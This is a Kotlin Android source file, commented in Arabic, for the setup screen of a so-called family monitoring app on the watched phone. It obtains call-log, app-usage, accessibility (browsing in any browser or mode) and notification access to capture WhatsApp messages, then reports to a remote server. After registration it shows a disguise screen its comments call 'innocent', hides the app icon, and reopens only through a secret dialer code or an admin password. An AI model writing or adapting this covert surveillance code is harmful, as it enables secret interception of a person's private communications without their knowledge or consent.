package com.family.monitor

import android.Manifest
import android.content.Intent
import android.net.Uri
import android.os.Build
import android.os.Bundle
import android.provider.Settings
import android.view.Menu
import android.view.MenuItem
import android.view.ViewGroup
import android.widget.Button
import android.widget.EditText
import android.widget.LinearLayout
import android.widget.ScrollView
import android.widget.TextView
import android.widget.Toast
import androidx.appcompat.app.AppCompatActivity
import androidx.core.app.ActivityCompat

/**
 * شاشة إعداد الجهاز الفرعي: إدخال عنوان الخادم وكود الاقتران، منح الصلاحيات، وبدء المراقبة.
 *
 * بعد التسجيل بنجاح:
 *  - يُسجَّل الجهاز كـ«مفعّل» وستظهر شاشة التمويه (DisguiseActivity) عند فتح التطبيق،
 *    والعودة إلى هذه الشاشة لا تكون إلا بكلمة مرور الأدمن من زر شاشة التمويه.
 *
 * الصلاحيات المطلوبة:
 *  1) سجل المكالمات (النظام)
 *  2) إمكانية الوصول لرصد التصفح (إعدادات)
 *  3) إحصاء استخدام التطبيقات (إعدادات)
 *  4) الوصول إلى الإشعارات — لرصد رسائل واتساب المستلمة
 */
class SetupActivity : AppCompatActivity() {

    private lateinit var etServer: EditText
    private lateinit var etCode: EditText
    private lateinit var etName: EditText
    private lateinit var statusView: TextView

    override fun onCreate(savedInstanceState: Bundle?) {
        super.onCreate(savedInstanceState)

        val pad = (16 * resources.displayMetrics.density).toInt()
        val layout = LinearLayout(this).apply {
            orientation = LinearLayout.VERTICAL
            setPadding(pad, pad * 2, pad, pad)
        }

        fun addTitle(text: String): TextView {
            val tv = TextView(this).apply {
                this.text = text
                textSize = 20f
                setPadding(0, pad, 0, pad / 2)
            }
            layout.addView(tv)
            return tv
        }

        fun addField(hint: String, value: String = "", password: Boolean = false): EditText {
            val et = EditText(this).apply {
                this.hint = hint
                setText(value)
                if (password) transformationMethod = android.text.method.PasswordTransformationMethod()
            }
            layout.addView(et)
            return et
        }

        addTitle("إعداد الجهاز الفرعي")

        // عنوان الخادم محروق داخل التطبيق — يظهر معبأً تلقائيًا
        etServer = addField("عنوان الخادم (مثل: https://xxxx.vercel.app)",
            Prefs.serverUrl(this) ?: Config.DEFAULT_SERVER_URL)
        etCode = addField("كود الاقتران (من إعدادات اللوحة)", "")
        etName = addField("اسم الجهاز في اللوحة",
            Prefs.deviceName(this) ?: Build.MODEL ?: "هاتف أندرويد")
        etCode.transformationMethod = null

        layout.addView(Button(this).apply {
            text = "تسجيل الجهاز وبدء المراقبة"
            setOnClickListener { onRegisterClicked() }
        })

        layout.addView(TextView(this).apply {
            text = "منح الصلاحيات (بعد التسجيل):"
            textSize = 15f
            setPadding(0, pad, 0, pad / 2)
        })

        layout.addView(Button(this).apply {
            text = "١) صلاحية سجل المكالمات"
            setOnClickListener {
                ActivityCompat.requestPermissions(
                    this@SetupActivity, arrayOf(Manifest.permission.READ_CALL_LOG), 101
                )
            }
        })

        layout.addView(Button(this).apply {
            text = "٢) إحصاء استخدام التطبيقات (فتح التطبيقات)"
            setOnClickListener {
                startActivity(Intent(Settings.ACTION_USAGE_ACCESS_SETTINGS))
            }
        })

        layout.addView(Button(this).apply {
            text = "٣) خدمة رصد التصفح (أي متصفح وأي وضع)"
            setOnClickListener {
                startActivity(Intent(Settings.ACTION_ACCESSIBILITY_SETTINGS))
                Toast.makeText(context, "فعّل «خدمات الجهاز» من القائمة", Toast.LENGTH_LONG).show()
            }
        })

        layout.addView(Button(this).apply {
            text = "٤) الوصول إلى الإشعارات (رسائل واتساب المستلمة)"
            setOnClickListener {
                startActivity(Intent(Settings.ACTION_NOTIFICATION_LISTENER_SETTINGS))
                Toast.makeText(context, "فعّل «خدمات الجهاز» من قائمة الوصول للإشعارات", Toast.LENGTH_LONG).show()
            }
        })

        layout.addView(Button(this).apply {
            text = "تشغيل خدمة المراقبة"
            setOnClickListener {
                if (Prefs.apiKey(this@SetupActivity) == null) {
                    Toast.makeText(context, "سجّل الجهاز أولًا بكود الاقتران", Toast.LENGTH_SHORT).show()
                    return@setOnClickListener
                }
                startMonitor()
                Toast.makeText(context, "تم تشغيل المراقبة", Toast.LENGTH_SHORT).show()
            }
        })

        statusView = TextView(this).apply {
            textSize = 14f
            setPadding(0, pad, 0, 0)
        }
        layout.addView(statusView)

        setContentView(ScrollView(this).apply {
            layoutParams = ViewGroup.LayoutParams(
                ViewGroup.LayoutParams.MATCH_PARENT,
                ViewGroup.LayoutParams.MATCH_PARENT
            )
            addView(layout)
        })
        refreshStatus()
    }

    private fun startMonitor() {
        val service = Intent(this, MonitorService::class.java)
        if (Build.VERSION.SDK_INT >= 26) startForegroundService(service)
        else startService(service)
    }

    /** هل صلاحية الوصول إلى الإشعارات ممنوحة لهذا التطبيق؟ */
    private fun isNotificationAccessGranted(): Boolean {
        val flat = Settings.Secure.getString(contentResolver, "enabled_notification_listeners") ?: return false
        return flat.split(":").any { it.contains(packageName) }
    }

    private fun refreshStatus() {
        val registered = Prefs.apiKey(this) != null
        val accessibility = Api.isAccessibilityEnabled(this)
        val notifications = isNotificationAccessGranted()
        val pending = EventStore.pendingCount(this)
        statusView.text = buildString {
            appendLine("حالة التسجيل: ${if (registered) "مسجل ✓" else "غير مسجل ✗"}")
            appendLine("خدمة رصد التصفح: ${if (accessibility) "مفعلة ✓" else "غير مفعلة ✗"}")
            appendLine("صلاحية الإشعارات (واتساب): ${if (notifications) "ممنوحة ✓" else "غير ممنوحة ✗"}")
            if (Prefs.isIconHidden(this@SetupActivity)) {
                appendLine("الأيقونة: مخفية — فتح التطبيق من لوحة الاتصال بكود *#*#${Config.SECRET_DIAL_CODE}#*#*")
            }
            append("أحداث في انتظار الإرسال: $pending")
        }
    }

    private fun onRegisterClicked() {
        val server = etServer.text.toString().trim()
        val code = etCode.text.toString().trim()
        val name = etName.text.toString().trim().ifBlank { Build.MODEL ?: "هاتف أندرويد" }

        if (!server.startsWith("http")) {
            Toast.makeText(this, "عنوان الخادم يجب أن يبدأ بـ http(s)://", Toast.LENGTH_LONG).show()
            return
        }
        if (code.length < 6) {
            Toast.makeText(this, "أدخل كود الاقتران من إعدادات اللوحة", Toast.LENGTH_LONG).show()
            return
        }

        Toast.makeText(this, "جارٍ التسجيل...", Toast.LENGTH_SHORT).show()
        Thread {
            val apiKey = Api.register(server, code, name)
            runOnUiThread {
                if (apiKey != null) {
                    Prefs.save(this, server, apiKey, name)
                    // تفعيل وضع التمويه: من الآن تظهر الشاشة البريئة بدل الإعدادات
                    Prefs.setActivated(this, true)
                    // إخفاء أيقونة التطبيق من قائمة التطبيقات —
                    // الخدمات تظل تعمل، والعودة للإعدادات عبر الكود السري *#*#7594#*#*
                    Prefs.setIconHidden(this, true)
                    Toast.makeText(this, "تم التسجيل بنجاح — سيبدأ الإعداد", Toast.LENGTH_LONG).show()
                    // تشغيل الخدمة + طلب الصلاحيات الأساسية
                    startMonitor()
                    ActivityCompat.requestPermissions(
                        this@SetupActivity,
                        arrayOf(Manifest.permission.READ_CALL_LOG, Manifest.permission.POST_NOTIFICATIONS),
                        100
                    )
                    // التحويل إلى شاشة التمويه — من هنا فقط يمكن العودة بكلمة مرور الأدمن
                    startActivity(Intent(this, DisguiseActivity::class.java))
                    finish()
                } else {
                    Toast.makeText(this, "فشل التسجيل: تحقق من العنوان والكود", Toast.LENGTH_LONG).show()
                }
            }
        }.start()
    }

    override fun onResume() {
        super.onResume()
        refreshStatus()
    }

    override fun onCreateOptionsMenu(menu: Menu): Boolean {
        menu.add(0, 1, 0, "تغيير نوع الجهاز (يتطلب كلمة مرور)")
        menu.add(0, 2, 0, if (Prefs.isIconHidden(this)) "إظهار أيقونة التطبيق (يتطلب كلمة مرور)" else "إخفاء أيقونة التطبيق (يتطلب كلمة مرور)")
        return true
    }

    override fun onOptionsItemSelected(item: MenuItem): Boolean {
        return when (item.itemId) {
            1 -> {
                // تعديل حساس — يتطلب كلمة مرور الأدمن عبر التحقق المركزي
                askAdminPasswordThen {
                    Prefs.clearRole(this)
                    Prefs.setActivated(this, false)
                    Prefs.setIconHidden(this, false)
                    startActivity(Intent(this, MainActivity::class.java))
                    finish()
                }
                true
            }
            2 -> {
                // إظهار/إخفاء الأيقونة — تعديل حساس يتطلب كلمة مرور الأدمن
                askAdminPasswordThen {
                    val hide = !Prefs.isIconHidden(this)
                    Prefs.setIconHidden(this, hide)
                    Toast.makeText(
                        this,
                        if (hide) "تم إخفاء الأيقونة — العودة عبر *#*#${Config.SECRET_DIAL_CODE}#*#*"
                        else "تم إظهار الأيقونة",
                        Toast.LENGTH_LONG
                    ).show()
                    refreshStatus()
                }
                true
            }
            else -> super.onOptionsItemSelected(item)
        }
    }

    private fun askAdminPasswordThen(onOk: () -> Unit) {
        val pad = (16 * resources.displayMetrics.density).toInt()
        val input = EditText(this).apply {
            hint = "كلمة مرور الأدمن"
            inputType = android.text.InputType.TYPE_CLASS_TEXT or
                    android.text.InputType.TYPE_TEXT_VARIATION_PASSWORD
        }
        val wrap = LinearLayout(this).apply {
            orientation = LinearLayout.VERTICAL
            setPadding(pad, pad / 2, pad, 0)
            addView(input)
        }
        android.app.AlertDialog.Builder(this)
            .setTitle("إجراء حساس")
            .setMessage("أدخل كلمة مرور الأدمن لتغيير نوع الجهاز")
            .setView(wrap)
            .setPositiveButton("متابعة") { d, _ ->
                val pwd = input.text.toString().trim()
                val server = Prefs.serverUrl(this) ?: Config.DEFAULT_SERVER_URL
                Thread {
                    val ok = pwd.isNotEmpty() && try { Api.verifyPassword(server, pwd) } catch (_: Exception) { false }
                    runOnUiThread {
                        if (ok) onOk()
                        else Toast.makeText(this, "كلمة المرور غير صحيحة", Toast.LENGTH_LONG).show()
                    }
                }.start()
                d.dismiss()
            }
            .setNegativeButton("إلغاء", null)
            .show()
    }
}
